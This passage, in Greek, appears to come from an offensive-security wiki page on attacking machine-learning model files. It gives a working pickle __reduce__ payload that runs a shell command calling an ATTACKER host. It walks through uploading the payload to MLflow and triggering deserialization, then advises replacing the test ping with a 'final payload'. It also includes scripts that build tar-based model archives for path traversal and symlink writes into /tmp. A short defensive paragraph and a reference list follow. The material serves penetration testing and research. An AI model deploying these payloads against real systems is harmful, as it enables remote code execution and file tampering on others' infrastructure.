  --data-binary @payload.pkl
```

Ένας minimal reducer μπορεί να εκτελέσει μια εντολή μόλις ο consumer κάνει unpickle το artifact. Η δημιουργία του payload με την έκδοση της Python που δηλώνεται στο `MLmodel` αποφεύγει προβλήματα συμβατότητας.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Ενεργοποιήστε τη λειτουργία που **φορτώνει το υπάρχον μοντέλο**, όπως πρόβλεψη, βαθμολόγηση ή ανάπτυξη. Μην κάνετε πρώτα retrain, επειδή η εκπαίδευση μπορεί να αντικαταστήσει το κακόβουλο artifact με ένα νέο μοντέλο. Ένα σφάλμα της εφαρμογής δεν αναιρεί την εκμετάλλευση: ο reducer επιστρέφει την ακέραια τιμή κατάστασης εξόδου της εντολής αντί για ένα αξιοποιήσιμο μοντέλο. Ξεκινήστε με μια παρατηρήσιμη παρενέργεια, όπως ένα αίτημα ICMP ή μια HTTP callback, και μετά αντικαταστήστε την με το τελικό payload.<sup>[[20]](#references)</sup>

Κατά την αξιολόγηση, διακρίνετε το δικαίωμα δημιουργίας ενός run από το δικαίωμα αντικατάστασης artifacts που ανήκουν σε άλλο run. Εξετάστε τον έλεγχο ταυτότητας και τα δικαιώματα ενημέρωσης ανά run, ελέγξτε για απρόσμενες τροποποιήσεις του `python_model.pkl` και αντιμετωπίστε την προέλευση και την ακεραιότητα του μοντέλου ως μέρος του ορίου εκτέλεσης. Ο τρέχων κώδικας του MLflow υποστηρίζει επίσης τη ρύθμιση `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` και συνιστά artifacts models-from-code αντί για φόρτωση δεδομένων cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Εκτεθειμένοι model servers και υποδομή ML

Η φόρτωση ενός κακόβουλου μοντέλου δεν είναι ο μόνος τρόπος εκτέλεσης κώδικα σε υποδομή ML. Τα API υποβολής εργασιών, τα endpoints επικύρωσης κώδικα και οι λήψεις από μητρώα μοντέλων υπηρεσιών AI που φιλοξενούνται από τους ίδιους τους χρήστες μπορούν να οδηγήσουν σε εκτέλεση κώδικα χωρίς κανένα αρχείο μοντέλου. Δείτε το [Exposed Self-Hosted AI Services](AI-Exposed-Self-Hosted-AI-Services.md).

## Μοντέλα σε Path Traversal

Όπως αναφέρεται [**σε αυτήν την ανάρτηση ιστολογίου**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), οι περισσότερες μορφές μοντέλων που χρησιμοποιούνται από διάφορα AI frameworks βασίζονται σε αρχεία αρχειοθέτησης, συνήθως `.zip`. Επομένως, ίσως είναι δυνατή η κατάχρηση αυτών των μορφών για επιθέσεις path traversal, ώστε να είναι δυνατή η ανάγνωση αυθαίρετων αρχείων από το σύστημα στο οποίο φορτώνεται το μοντέλο.<sup>[[16]](#references)</sup>

Για παράδειγμα, με τον ακόλουθο κώδικα μπορείτε να δημιουργήσετε ένα μοντέλο που θα δημιουργήσει ένα αρχείο στον κατάλογο `/tmp` κατά τη φόρτωσή του:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Ή, με τον ακόλουθο κώδικα μπορείτε να δημιουργήσετε ένα μοντέλο που θα δημιουργήσει ένα symlink προς τον κατάλογο `/tmp` κατά τη φόρτωσή του:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Εμβάθυνση: αποσειριοποίηση του Keras .keras και αναζήτηση gadget

Για έναν στοχευμένο οδηγό σχετικά με τα εσωτερικά του .keras, το RCE μέσω Lambda-layer, το ζήτημα αυθαίρετων εισαγωγών στις εκδόσεις ≤ 3.8 και την ανακάλυψη gadget μετά τη διόρθωση μέσα στη λίστα επιτρεπόμενων, δείτε:


{{#ref}}
keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog – "CVE-2024-12029 – Αποσειριοποίηση μη έμπιστων δεδομένων στο InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Patch commit 756008d του InvokeAI](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Τεκμηρίωση της μονάδας Metasploit της Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – ζητήματα ασφαλείας για το torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298: Απόκτηση απομακρυσμένης εκτέλεσης κώδικα στο NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Γνωστοποίηση της ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Patch commit b7eaea5 του Transformers4Rec (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Ευάλωτος loader πριν από το patch (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC κακόβουλου checkpoint (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader μετά το patch (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Απομακρυσμένη εκτέλεση κώδικα με σύγχρονες μορφές και βιβλιοθήκες AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Τεκμηρίωση της Hydra για το instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit αποκλεισμού της Hydra (προειδοποίηση σχετικά με RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Από SQLi σε RCE: Εκμετάλλευση του checkpointer του LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Μετατρέποντας σφάλματα Archive Slip σε bounty υψηλής αξίας για AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Γνωστοποίηση της Snyk και proof of concept για το PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Πηγαίος κώδικας του MLflow – `model.py` του PyFunc](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [REST API του MLflow – endpoints λήψης και μεταφόρτωσης artifacts](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Ταξινομία αποφυγής στατικού σαρωτή MLTracer της Binarly](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – Ανίχνευση κακόβουλων μοντέλων με το MLTracer](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [Υλοποίηση του PyTorch για το storage `_load_from_bytes`](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [Αντιστοίχιση συμβατότητας `find_class` του pickle στο CPython](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [Αντιστοίχιση εισαγωγών `_compat_pickle` του CPython](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
